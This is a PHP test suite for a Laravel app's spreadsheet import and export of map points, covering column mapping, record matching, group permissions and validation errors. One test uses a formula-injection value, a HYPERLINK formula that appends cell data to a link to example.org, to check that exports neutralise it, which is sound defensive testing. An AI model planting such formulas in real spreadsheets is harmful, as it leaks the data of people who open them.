<?php

use App\Enums\SpreadsheetFormat;
use App\Exports\MapPointsExport;
use App\Models\Group;
use App\Models\MapPoint;
use App\Models\MapPointCategory;
use App\Models\User;
use App\Services\SessionService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Maatwebsite\Excel\Concerns\FromArray;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

uses(RefreshDatabase::class);

beforeEach(function (): void {
    Config::set('app.group_context', 'group');
    Storage::fake('local');

    $this->group = Group::factory()->create(['name' => 'Initiative']);
});

function actingAsImportAdmin(TestCase $test, Group $group): User
{
    $admin = User::factory()->create(['is_admin' => false]);
    $group->users()->attach($admin, ['is_admin' => true]);
    app(SessionService::class)->actAsGroup($group, true);
    $test->actingAs($admin);

    return $admin;
}

function uploadMapPointFile(TestCase $test, string $content, string $filename = 'punkte.csv'): string
{
    $response = $test->post(route('mappoints.import.upload'), [
        'file' => UploadedFile::fake()->createWithContent($filename, $content),
    ]);

    $response->assertRedirect()->assertSessionHasNoErrors();
    parse_str((string) parse_url((string) $response->headers->get('Location'), PHP_URL_QUERY), $query);

    return (string) $query['token'];
}

/**
 * Builds a file shaped like a list of installations kept in Excel: semicolons, CRLF line endings,
 * umlauts in headers and quoted descriptions spanning several lines.
 *
 * @param  array<int, string>  $dataLines
 */
function installationsCsv(array $dataLines): string
{
    return implode("\r\n", [
        'Nr;Bezeichnung;kurze Beschreibung;Leistung;Art der Anlage;Ortsbezeichnung;Y-Koordinate;X-Koordinate',
        ...$dataLines,
    ])."\r\n";
}

/**
 * The mapping for installationsCsv(): running number and rating are ignored.
 *
 * @return array<int, array{header: string, field: string}>
 */
function installationColumns(): array
{
    return [
        ['header' => 'Nr', 'field' => 'ignore'],
        ['header' => 'Bezeichnung', 'field' => 'title'],
        ['header' => 'kurze Beschreibung', 'field' => 'description'],
        ['header' => 'Leistung', 'field' => 'ignore'],
        ['header' => 'Art der Anlage', 'field' => 'category'],
        ['header' => 'Ortsbezeichnung', 'field' => 'location'],
        ['header' => 'Y-Koordinate', 'field' => 'lat'],
        ['header' => 'X-Koordinate', 'field' => 'lng'],
    ];
}

/**
 * @param  array<int, array{header: string, field: string}>  $columns
 * @return array<string, mixed>
 */
function importPayload(string $token, array $columns, string $keyField = 'title', bool $defaultPublished = false): array
{
    return ['token' => $token, 'key_field' => $keyField, 'default_published' => $defaultPublished, 'columns' => $columns];
}

test('an uploaded spreadsheet shows its original headers and first rows', function (): void {
    actingAsImportAdmin($this, $this->group);

    $token = uploadMapPointFile($this, installationsCsv([
        "1;Balkonkraftwerk Musterweg 5;\"Steckersolargerät mit 800 Watt.\nWird im Frühjahr gereinigt.\";0,8 kWp;Photovoltaik;Musterstadt Nord;49.123456;8.654321",
        '2;Wärmepumpe Beispielhof;Luft-Wasser-Wärmepumpe mit Pufferspeicher;9 kW;Wärmepumpe;Musterstadt Süd;49,234567;8,765432',
    ]));

    $this->get(route('mappoints.import.create', ['token' => $token]))
        ->assertOk()
        ->assertInertia(fn ($page) => $page
            ->component('MapPoints/Import')
            ->where('upload.headers', ['Nr', 'Bezeichnung', 'kurze Beschreibung', 'Leistung', 'Art der Anlage', 'Ortsbezeichnung', 'Y-Koordinate', 'X-Koordinate'])
            ->where('upload.row_count', 2)
            ->where('upload.preview_rows.0.1', 'Balkonkraftwerk Musterweg 5')
            ->where('upload.preview_rows.0.2', "Steckersolargerät mit 800 Watt.\nWird im Frühjahr gereinigt.")
        );
});

test('unsupported files are rejected on upload', function (): void {
    actingAsImportAdmin($this, $this->group);

    $this->post(route('mappoints.import.upload'), [
        'file' => UploadedFile::fake()->createWithContent('punkte.pdf', '%PDF-1.4'),
    ])->assertSessionHasErrors(['file']);
});

test('the preview reports what the import would do without keeping any change', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv([
        '1;Balkonkraftwerk Musterweg 5;Steckersolargerät;0,8 kWp;Photovoltaik;Musterstadt Nord;49.123456;8.654321',
    ]));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, installationColumns()))
        ->assertOk()
        ->assertJsonPath('rows.0.row', 2)
        ->assertJsonPath('rows.0.is_update', false)
        ->assertJsonPath('rows.0.title', 'Balkonkraftwerk Musterweg 5')
        ->assertJsonPath('rows.0.category', 'Photovoltaik')
        ->assertJsonPath('rows.0.group_name', 'Initiative')
        ->assertJsonPath('created_count', 1)
        ->assertJsonPath('updated_count', 0)
        ->assertJsonPath('created_categories', ['Photovoltaik'])
        ->assertJsonPath('errors', []);

    $this->assertDatabaseCount('map_points', 0);
    $this->assertDatabaseCount('map_point_categories', 0);
});

test('an import creates unpublished map points and missing categories in the current group', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv([
        '2;Wärmepumpe Beispielhof;Luft-Wasser-Wärmepumpe mit Pufferspeicher;9 kW;Wärmepumpe;Musterstadt Süd;49,234567;8,765432',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, installationColumns()))
        ->assertRedirect(route('mappoints.index'))
        ->assertSessionHas('success');

    $mapPoint = MapPoint::with('category')->sole();

    expect($mapPoint->group_id)->toBe($this->group->id)
        ->and($mapPoint->title)->toBe('Wärmepumpe Beispielhof')
        ->and($mapPoint->location)->toBe('Musterstadt Süd')
        ->and($mapPoint->published)->toBeFalse()
        ->and($mapPoint->coordinate->lat)->toEqualWithDelta(49.234567, 0.000001)
        ->and($mapPoint->coordinate->lng)->toEqualWithDelta(8.765432, 0.000001)
        ->and($mapPoint->category->name)->toBe('Wärmepumpe')
        ->and($mapPoint->category->group_id)->toBe($this->group->id);
});

test('categories are matched by name regardless of case, including inherited ones', function (): void {
    $parentCategory = MapPointCategory::factory()->for($this->group)->create(['name' => 'Photovoltaik']);
    $childGroup = Group::factory()->create(['parent_id' => $this->group->id]);
    actingAsImportAdmin($this, $childGroup);

    $token = uploadMapPointFile($this, installationsCsv([
        '1;Balkonkraftwerk Musterweg 5;Steckersolargerät;0,8 kWp;photovoltaik;Musterstadt Nord;49.123456;8.654321',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, installationColumns()))
        ->assertRedirect(route('mappoints.index'));

    expect(MapPoint::sole()->category_id)->toBe($parentCategory->id)
        ->and(MapPointCategory::count())->toBe(1);
});

test('an import updates points matched by id and leaves other points untouched', function (): void {
    actingAsImportAdmin($this, $this->group);
    $matchedPoint = MapPoint::factory()->for($this->group)->create(['title' => 'Alter Titel', 'published' => false]);
    $otherPoint = MapPoint::factory()->for($this->group)->create(['title' => 'Unbeteiligt']);

    $token = uploadMapPointFile($this, implode("\r\n", [
        'ID;Titel;Breitengrad;Längengrad;Veröffentlicht',
        "{$matchedPoint->uuid};Neuer Titel;49.123456;8.654321;ja",
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, [
        ['header' => 'ID', 'field' => 'id'],
        ['header' => 'Titel', 'field' => 'title'],
        ['header' => 'Breitengrad', 'field' => 'lat'],
        ['header' => 'Längengrad', 'field' => 'lng'],
        ['header' => 'Veröffentlicht', 'field' => 'published'],
    ], keyField: 'id'))->assertRedirect(route('mappoints.index'));

    expect($matchedPoint->refresh()->title)->toBe('Neuer Titel')
        ->and($matchedPoint->published)->toBeTrue()
        ->and($matchedPoint->uuid)->not->toBeEmpty()
        ->and($otherPoint->refresh()->title)->toBe('Unbeteiligt')
        ->and(MapPoint::count())->toBe(2);
});

test('an import can match points by title and update the other mapped fields', function (): void {
    actingAsImportAdmin($this, $this->group);
    $mapPoint = MapPoint::factory()->for($this->group)->create(['title' => 'Wärmepumpe Schulzentrum', 'description' => 'Alt']);

    $token = uploadMapPointFile($this, installationsCsv([
        '18;Wärmepumpe Schulzentrum;Jetzt mit Pufferspeicher;12 kW;Photovoltaik;Musterstadt Süd;49.345678;8.876543',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, installationColumns()))
        ->assertRedirect(route('mappoints.index'));

    expect(MapPoint::count())->toBe(1)
        ->and($mapPoint->refresh()->description)->toBe('Jetzt mit Pufferspeicher')
        ->and($mapPoint->location)->toBe('Musterstadt Süd');
});

test('points are matched by title regardless of case and keep their own spelling', function (): void {
    actingAsImportAdmin($this, $this->group);
    $mapPoint = MapPoint::factory()->for($this->group)->create(['title' => 'Wärmepumpe Schulzentrum', 'description' => 'Alt']);

    $token = uploadMapPointFile($this, installationsCsv([
        '18;WÄRMEPUMPE schulzentrum;Jetzt mit Pufferspeicher;12 kW;Photovoltaik;Musterstadt Süd;49.345678;8.876543',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, installationColumns()))
        ->assertRedirect(route('mappoints.index'));

    expect(MapPoint::count())->toBe(1)
        ->and($mapPoint->refresh()->title)->toBe('Wärmepumpe Schulzentrum')
        ->and($mapPoint->description)->toBe('Jetzt mit Pufferspeicher');
});

test('rows with errors are reported and nothing is imported', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv([
        '1;Gültiger Punkt;Beschreibung;0,8 kWp;Photovoltaik;Musterstadt Nord;49.123456;8.654321',
        '2;;Ohne Titel;9 kW;Photovoltaik;Musterstadt Süd;49.234567;8.765432',
        '3;Falsche Koordinate;Beschreibung;9 kW;Photovoltaik;Musterstadt Süd;151.1;keine Zahl',
    ]));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, installationColumns()))
        ->assertOk()
        ->assertJsonPath('errors', [
            ['row' => 3, 'column' => 'Bezeichnung', 'message' => 'Der Titel fehlt.'],
            ['row' => 4, 'column' => 'Y-Koordinate', 'message' => 'Kein gültiger Breitengrad.'],
            ['row' => 4, 'column' => 'X-Koordinate', 'message' => 'Kein gültiger Längengrad.'],
        ]);

    $this->post(route('mappoints.import.store'), importPayload($token, installationColumns()))
        ->assertSessionHasErrors(['import']);

    $this->assertDatabaseCount('map_points', 0);
    $this->assertDatabaseCount('map_point_categories', 0);
});

test('a key value that matches several points is reported', function (): void {
    actingAsImportAdmin($this, $this->group);
    MapPoint::factory()->for($this->group)->count(2)->create(['title' => 'Doppelter Titel']);
    $token = uploadMapPointFile($this, installationsCsv([
        '1;Doppelter Titel;Beschreibung;0,8 kWp;Photovoltaik;Musterstadt Nord;49.123456;8.654321',
    ]));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, installationColumns()))
        ->assertJsonPath('errors.0.message', 'Mehrere Kartenpunkte haben diesen Wert.');
});

test('a key value repeated in the file is reported regardless of case', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv([
        '1;Gleicher Titel;Beschreibung;0,8 kWp;Photovoltaik;Musterstadt Nord;49.123456;8.654321',
        '2;GLEICHER titel;Beschreibung;0,8 kWp;Photovoltaik;Musterstadt Nord;49.123456;8.654321',
    ]));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, installationColumns()))
        ->assertJsonPath('errors', [
            ['row' => 3, 'column' => 'Bezeichnung', 'message' => 'Dieser Wert kommt in der Datei mehrfach vor.'],
        ]);
});

/**
 * @return array<int, array{header: string, field: string}>
 */
function idKeyColumns(): array
{
    return [
        ['header' => 'ID', 'field' => 'id'],
        ['header' => 'Titel', 'field' => 'title'],
        ['header' => 'Breitengrad', 'field' => 'lat'],
        ['header' => 'Längengrad', 'field' => 'lng'],
    ];
}

$foreignPointMessage = 'Dieser Kartenpunkt gehört zu einer anderen Initiative. Soll er hier neu angelegt werden, stelle die ID-Spalte auf „Ignorieren“.';

function idKeyCsv(string $uuid, string $title): string
{
    return implode("\r\n", ['ID;Titel;Breitengrad;Längengrad', "{$uuid};{$title};49.123456;8.654321"]);
}

test('a spreadsheet copied from another initiative cannot change its points', function () use ($foreignPointMessage): void {
    actingAsImportAdmin($this, $this->group);
    $foreignPoint = MapPoint::factory()->create(['title' => 'Wärmepumpe Musterhof']);

    $token = uploadMapPointFile($this, idKeyCsv($foreignPoint->uuid, 'Übernommen'));
    $payload = importPayload($token, idKeyColumns(), keyField: 'id');

    $this->postJson(route('mappoints.import.preview'), $payload)
        ->assertOk()
        ->assertJsonPath('errors.0.message', $foreignPointMessage);

    $this->post(route('mappoints.import.store'), $payload)->assertSessionHasErrors(['import']);

    expect($foreignPoint->refresh()->title)->toBe('Wärmepumpe Musterhof')
        ->and($foreignPoint->group_id)->not->toBe($this->group->id)
        ->and(MapPoint::count())->toBe(1);
});

test('a point of a parent initiative cannot be changed from a sub initiative', function () use ($foreignPointMessage): void {
    $parentPoint = MapPoint::factory()->for($this->group)->create(['title' => 'Anlage der Hauptinitiative']);
    actingAsImportAdmin($this, Group::factory()->create(['parent_id' => $this->group->id]));

    $token = uploadMapPointFile($this, idKeyCsv($parentPoint->uuid, 'Übernommen'));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, idKeyColumns(), keyField: 'id'))
        ->assertJsonPath('errors.0.message', $foreignPointMessage);

    expect($parentPoint->refresh()->title)->toBe('Anlage der Hauptinitiative');
});

test('a point of a sub initiative is updated from its parent initiative', function (): void {
    $childGroup = Group::factory()->create(['parent_id' => $this->group->id, 'name' => 'Unterinitiative']);
    $childPoint = MapPoint::factory()->for($childGroup)->create(['title' => 'Alter Titel']);
    actingAsImportAdmin($this, $this->group);

    $token = uploadMapPointFile($this, idKeyCsv($childPoint->uuid, 'Neuer Titel'));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, idKeyColumns(), keyField: 'id'))
        ->assertJsonPath('rows.0.is_update', true)
        ->assertJsonPath('rows.0.group_name', 'Unterinitiative');

    $this->post(route('mappoints.import.store'), importPayload($token, idKeyColumns(), keyField: 'id'))
        ->assertRedirect(route('mappoints.index'));

    expect($childPoint->refresh()->title)->toBe('Neuer Titel')
        ->and($childPoint->group_id)->toBe($childGroup->id);
});

test('a title used by another initiative creates a new point instead of changing theirs', function (): void {
    actingAsImportAdmin($this, $this->group);
    $foreignPoint = MapPoint::factory()->create(['title' => 'Balkonkraftwerk Musterweg 5', 'description' => 'Anlage der anderen Initiative']);

    $token = uploadMapPointFile($this, implode("\r\n", [
        'Titel;Beschreibung;Breitengrad;Längengrad',
        'Balkonkraftwerk Musterweg 5;Eigene Anlage;49.123456;8.654321',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, [
        ['header' => 'Titel', 'field' => 'title'],
        ['header' => 'Beschreibung', 'field' => 'description'],
        ['header' => 'Breitengrad', 'field' => 'lat'],
        ['header' => 'Längengrad', 'field' => 'lng'],
    ]))->assertRedirect(route('mappoints.index'));

    expect($foreignPoint->refresh()->description)->toBe('Anlage der anderen Initiative')
        ->and(MapPoint::where('group_id', $this->group->id)->sole()->description)->toBe('Eigene Anlage');
});

test('the mapping must assign title, coordinates and the key field', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv(['1;Punkt;Text;0,8 kWp;Photovoltaik;Ort;49.123456;8.654321']));

    $columns = installationColumns();
    $columns[6]['field'] = 'ignore';

    $this->postJson(route('mappoints.import.preview'), importPayload($token, $columns, keyField: 'location'))
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['columns' => 'Diese Felder müssen einer Spalte zugeordnet sein: Breitengrad.']);
});

test('a field cannot be assigned to several columns', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv(['1;Punkt;Text;0,8 kWp;Photovoltaik;Ort;49.123456;8.654321']));

    $columns = installationColumns();
    $columns[3]['field'] = 'title';

    $this->postJson(route('mappoints.import.preview'), importPayload($token, $columns))
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['columns' => 'Diese Felder sind mehreren Spalten zugeordnet: Titel.']);
});

test('spreadsheets in excel and opendocument formats can be imported', function (SpreadsheetFormat $format): void {
    actingAsImportAdmin($this, $this->group);

    $spreadsheet = Excel::raw(new class implements FromArray
    {
        /**
         * @return array<int, array<int, string|float>>
         */
        public function array(): array
        {
            return [
                ['Titel', 'Breitengrad', 'Längengrad'],
                ['Balkonkraftwerk Turnhalle', 49.456789, 8.987654],
            ];
        }
    }, $format->excelType());

    $token = uploadMapPointFile($this, $spreadsheet, "punkte.{$format->value}");

    $this->post(route('mappoints.import.store'), importPayload($token, [
        ['header' => 'Titel', 'field' => 'title'],
        ['header' => 'Breitengrad', 'field' => 'lat'],
        ['header' => 'Längengrad', 'field' => 'lng'],
    ]))->assertRedirect(route('mappoints.index'));

    expect(MapPoint::sole()->coordinate->lat)->toEqualWithDelta(49.456789, 0.000001);
})->with([
    'xlsx' => SpreadsheetFormat::XLSX,
    'ods' => SpreadsheetFormat::ODS,
    'xls' => SpreadsheetFormat::XLS,
]);

test('an exported csv file can be imported again to update the points', function (): void {
    actingAsImportAdmin($this, $this->group);
    $mapPoint = MapPoint::factory()->for($this->group)->create(['title' => 'Alter Titel', 'description' => "Mehrzeilig;\nmit Semikolon"]);

    $export = new MapPointsExport(MapPoint::with('category')->get(), MapPointsExport::defaultColumns(), SpreadsheetFormat::CSV);
    $csv = str_replace('Alter Titel', 'Neuer Titel', Excel::raw($export, SpreadsheetFormat::CSV->excelType()));

    $token = uploadMapPointFile($this, $csv, 'kartenpunkte.csv');
    $columns = array_map(
        fn ($column): array => ['header' => $column->header, 'field' => $column->field->value],
        MapPointsExport::defaultColumns(),
    );

    $this->get(route('mappoints.import.create', ['token' => $token]))
        ->assertInertia(fn ($page) => $page->where('upload.headers', $export->headings()));

    $this->post(route('mappoints.import.store'), importPayload($token, $columns, keyField: 'id'))
        ->assertRedirect(route('mappoints.index'));

    expect(MapPoint::count())->toBe(1)
        ->and($mapPoint->refresh()->title)->toBe('Neuer Titel')
        ->and($mapPoint->description)->toBe("Mehrzeilig;\nmit Semikolon");
});

test('an upload cannot be used from another group', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv(['1;Punkt;Text;0,8 kWp;Photovoltaik;Ort;49.123456;8.654321']));

    actingAsImportAdmin($this, Group::factory()->create());

    $this->postJson(route('mappoints.import.preview'), importPayload($token, installationColumns()))
        ->assertNotFound();
});

test('group members without admin rights cannot import', function (): void {
    $member = User::factory()->create(['is_admin' => false]);
    $this->group->users()->attach($member, ['is_admin' => false]);
    app(SessionService::class)->actAsGroup($this->group, false);

    $this->actingAs($member)
        ->post(route('mappoints.import.upload'), ['file' => UploadedFile::fake()->createWithContent('punkte.csv', 'Titel')])
        ->assertForbidden();
});

test('the import needs a selected group', function (): void {
    Config::set('app.group_context', 'global');
    app(SessionService::class)->actAsSystemAdmin();

    $this->actingAs(User::factory()->create(['is_admin' => true]))
        ->get(route('mappoints.import.create'))
        ->assertForbidden();
});

test('without a key field every row creates a new map point', function (): void {
    actingAsImportAdmin($this, $this->group);
    MapPoint::factory()->for($this->group)->create(['title' => 'Balkonkraftwerk Musterweg 5']);

    $token = uploadMapPointFile($this, installationsCsv([
        '1;Balkonkraftwerk Musterweg 5;Erste Anlage;0,8 kWp;Photovoltaik;Musterstadt Süd;49.123456;8.654321',
        '2;Balkonkraftwerk Musterweg 5;Zweite Anlage;1,6 kWp;Photovoltaik;Musterstadt Süd;49.345678;8.876543',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, installationColumns(), keyField: 'ignore'))
        ->assertRedirect(route('mappoints.index'))
        ->assertSessionHasNoErrors();

    expect(MapPoint::where('title', 'Balkonkraftwerk Musterweg 5')->count())->toBe(3);
});

test('a file without an id column needs no key field', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, implode("\r\n", [
        'Bezeichnung;Y-Koordinate;X-Koordinate',
        'Balkonkraftwerk Turnhalle;49.456789;8.987654',
    ]));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, [
        ['header' => 'Bezeichnung', 'field' => 'title'],
        ['header' => 'Y-Koordinate', 'field' => 'lat'],
        ['header' => 'X-Koordinate', 'field' => 'lng'],
    ], keyField: 'ignore'))
        ->assertOk()
        ->assertJsonPath('rows.0.is_update', false)
        ->assertJsonPath('errors', []);
});

test('an id that belongs to no map point at all is reported as unknown', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, idKeyCsv('3f1a5d4e-0c62-4a5f-9f1e-6d2b8c7a4e55', 'Wärmepumpe Beispielhof'));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, idKeyColumns(), keyField: 'id'))
        ->assertOk()
        ->assertJsonPath('errors.0.message', 'Zu dieser ID gibt es keinen Kartenpunkt.');
});

test('an assigned id column may only be imported as the key field', function (string $keyField): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, idKeyCsv('3f1a5d4e-0c62-4a5f-9f1e-6d2b8c7a4e55', 'Wärmepumpe Beispielhof'));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, idKeyColumns(), keyField: $keyField))
        ->assertUnprocessable()
        ->assertJsonValidationErrors([
            'key_field' => 'Ist eine Spalte dem Feld „ID“ zugeordnet, werden vorhandene Punkte an der ID erkannt. Sollen die Zeilen neu angelegt werden, stelle die ID-Spalte auf „Ignorieren“.',
        ]);

    $this->assertDatabaseCount('map_points', 0);
})->with(['title', 'ignore']);

test('points of another initiative are copied over by ignoring the id column', function (): void {
    actingAsImportAdmin($this, $this->group);
    $foreignPoint = MapPoint::factory()->create(['title' => 'Wärmepumpe Beispielhof']);

    $token = uploadMapPointFile($this, idKeyCsv($foreignPoint->uuid, 'Wärmepumpe Beispielhof'));
    $columns = idKeyColumns();
    $columns[0]['field'] = 'ignore';

    $this->post(route('mappoints.import.store'), importPayload($token, $columns, keyField: 'ignore'))
        ->assertRedirect(route('mappoints.index'))
        ->assertSessionHasNoErrors();

    expect(MapPoint::where('group_id', $this->group->id)->sole()->title)->toBe('Wärmepumpe Beispielhof')
        ->and($foreignPoint->refresh()->group_id)->not->toBe($this->group->id);
});

test('a category only a sub initiative has is refused instead of creating a second one', function (): void {
    $childGroup = Group::factory()->create(['parent_id' => $this->group->id, 'name' => 'Unterinitiative']);
    MapPointCategory::factory()->for($childGroup)->create(['name' => 'Photovoltaik']);
    actingAsImportAdmin($this, $this->group);

    $token = uploadMapPointFile($this, installationsCsv([
        '1;Balkonkraftwerk Musterweg 5;Steckersolargerät;0,8 kWp;photovoltaik;Musterstadt Nord;49.123456;8.654321',
    ]));

    $this->postJson(route('mappoints.import.preview'), importPayload($token, installationColumns()))
        ->assertJsonPath('errors', [[
            'row' => 2,
            'column' => 'Art der Anlage',
            'message' => 'Die Kategorie „Photovoltaik“ gibt es nur in der Unterinitiative „Unterinitiative“. Klärt bitte untereinander, ob sie in diese Initiative verschoben oder umbenannt wird.',
        ]])
        ->assertJsonPath('created_categories', []);

    expect(MapPointCategory::count())->toBe(1);
});

test('a file repeating a column header is rejected on upload', function (): void {
    actingAsImportAdmin($this, $this->group);

    $this->post(route('mappoints.import.upload'), [
        'file' => UploadedFile::fake()->createWithContent('punkte.csv', "Titel;Breitengrad;Längengrad;titel\r\nPunkt;49.1;8.6;Doppelt"),
    ])->assertSessionHasErrors(['file' => 'Jede Spaltenüberschrift darf nur einmal vorkommen. Mehrfach vorhanden: „Titel“.']);

    expect(Storage::disk('local')->allFiles())->toBe([]);
});

test('text that looks like a formula is exported as text and imported unchanged', function (SpreadsheetFormat $format): void {
    actingAsImportAdmin($this, $this->group);
    $formula = '=HYPERLINK("https://example.org/?"&A2,"Details")';
    $mapPoint = MapPoint::factory()->for($this->group)->create(['title' => $formula, 'description' => '-3 Grad im Winter']);

    $file = Excel::raw(new MapPointsExport(MapPoint::with('category')->get(), MapPointsExport::defaultColumns(), $format), $format->excelType());

    if ($format === SpreadsheetFormat::CSV) {
        expect($file)->toContain("'=HYPERLINK")->toContain("'-3 Grad im Winter");
    } else {
        $path = tempnam(sys_get_temp_dir(), 'export');
        file_put_contents($path, $file);
        $sheet = IOFactory::load($path)->getActiveSheet();
        unlink($path);

        expect($sheet->getCell('B2')->getDataType())->toBe(DataType::TYPE_STRING)
            ->and($sheet->getCell('B2')->getValue())->toBe($formula);
    }

    $token = uploadMapPointFile($this, $file, "kartenpunkte.{$format->value}");
    $columns = array_map(
        fn ($column): array => ['header' => $column->header, 'field' => $column->field->value],
        MapPointsExport::defaultColumns(),
    );

    $this->post(route('mappoints.import.store'), importPayload($token, $columns, keyField: 'id'))
        ->assertRedirect(route('mappoints.index'));

    expect($mapPoint->refresh()->title)->toBe($formula)
        ->and($mapPoint->description)->toBe('-3 Grad im Winter');
})->with([
    'csv' => SpreadsheetFormat::CSV,
    'xlsx' => SpreadsheetFormat::XLSX,
]);

test('system admins without a selected group see why import and export are unavailable', function (): void {
    Config::set('app.group_context', 'global');
    app(SessionService::class)->actAsSystemAdmin();

    $this->actingAs(User::factory()->create(['is_admin' => true]))
        ->get(route('mappoints.index'))
        ->assertInertia(fn ($page) => $page
            ->where('canImportAndExport', true)
            ->where('importAndExportNeedGroup', true)
        );
});

test('new points are published when the import says so', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv([
        '1;Balkonkraftwerk Musterweg 5;Steckersolargerät;0,8 kWp;Photovoltaik;Musterstadt Nord;49.123456;8.654321',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, installationColumns(), defaultPublished: true))
        ->assertRedirect(route('mappoints.index'));

    expect(MapPoint::sole()->published)->toBeTrue();
});

test('the visibility of existing points is kept when the file has no column for it', function (): void {
    actingAsImportAdmin($this, $this->group);
    $mapPoint = MapPoint::factory()->for($this->group)->create(['title' => 'Wärmepumpe Beispielhof', 'published' => false]);

    $token = uploadMapPointFile($this, installationsCsv([
        '1;Wärmepumpe Beispielhof;Mit Pufferspeicher;9 kW;Wärmepumpe;Musterstadt Süd;49.234567;8.765432',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, installationColumns(), defaultPublished: true))
        ->assertRedirect(route('mappoints.index'));

    expect($mapPoint->refresh()->published)->toBeFalse();
});

test('a column for the visibility decides instead of the chosen default', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, implode("\r\n", [
        'Titel;Breitengrad;Längengrad;Veröffentlicht',
        'Balkonkraftwerk Musterweg 5;49.123456;8.654321;nein',
    ]));

    $this->post(route('mappoints.import.store'), importPayload($token, [
        ['header' => 'Titel', 'field' => 'title'],
        ['header' => 'Breitengrad', 'field' => 'lat'],
        ['header' => 'Längengrad', 'field' => 'lng'],
        ['header' => 'Veröffentlicht', 'field' => 'published'],
    ], defaultPublished: true))->assertRedirect(route('mappoints.index'));

    expect(MapPoint::sole()->published)->toBeFalse();
});

test('the visibility of new points must be sent', function (): void {
    actingAsImportAdmin($this, $this->group);
    $token = uploadMapPointFile($this, installationsCsv(['1;Anlage;Text;0,8 kWp;Photovoltaik;Ort;49.1;8.6']));

    $payload = importPayload($token, installationColumns());
    unset($payload['default_published']);

    $this->postJson(route('mappoints.import.preview'), $payload)
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['default_published']);
});
